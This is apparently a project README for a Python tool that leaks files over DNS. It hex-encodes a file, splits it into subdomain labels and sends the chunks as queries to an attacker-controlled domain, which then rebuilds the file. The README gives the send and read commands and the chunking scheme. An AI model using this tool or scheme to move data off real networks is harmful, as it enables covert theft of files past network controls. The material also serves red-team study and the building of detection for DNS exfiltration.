# DNS Leakage

DNS leak attack to leak a files over DNS queries

## Getting Started

In order to be able to capture the DNS requests you have to build your own DNS server.
### Prerequisites

Python 3
Build your own DNS server which support the following:
* Read subdoamin and determine what to do next:
** ```newfile``` is creating a new file that will include the following subdomain requests
** 2rd request is the file name
** 3rd request is the file size for validation
** 4rd request is the file signature for validation
* Write all DNS request (the full DNS address query) into a file

I used ChefDNS and edited the code to support the above

## How to use

### Send

To send a file execute the following:

```
python DNSLeakage_Send.py --file=SomeFile.doc --domain=*.MyDomain.com
```

The script will send (all in the subdoamin field):
* A newfile request (newfile.MyDomain.com)
* The file name (SomeFile.Doc.MyDomain.com)
* File size (1234.MyDomain.com)
* File signeture (Gs9x0w3adQLKkslAK63lsd.MyDomain.com)
* Hex the file and split it to n parts ```(n=sizeoffile/63 + sizeoffile%63/sizeoffile%63)``` and send each part in the subdoamin query

### Read

To read the file (which conatians all full DNS queries addresses) run the following command:

```
python DNSLeakage_Read.py --input=SomeFile.doc.hex --output=SomeFile.doc
```

The script will combine all the subdoamins attributes into the hexed file and decode it back to binary.
Afterwards the script will store the file (by output parameter).
The script will validate the original size and the signeture of the file to the decoded\leaked one and determine if its valid.

## Running the tests

POC folder contains a script which do the same as the above and it creates a new file as should be stored in the DNS server (file which contains the full DNS queries addresses)


## Built With

* Native Python3

## Authors

* **Yarden Yerushalmi** - https://www.linkedin.com/in/yarden-yerushalmi/)

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details

## Acknowledgments

* [DNSchef](http://thesprawl.org/projects/dnschef/) - DNS server in python
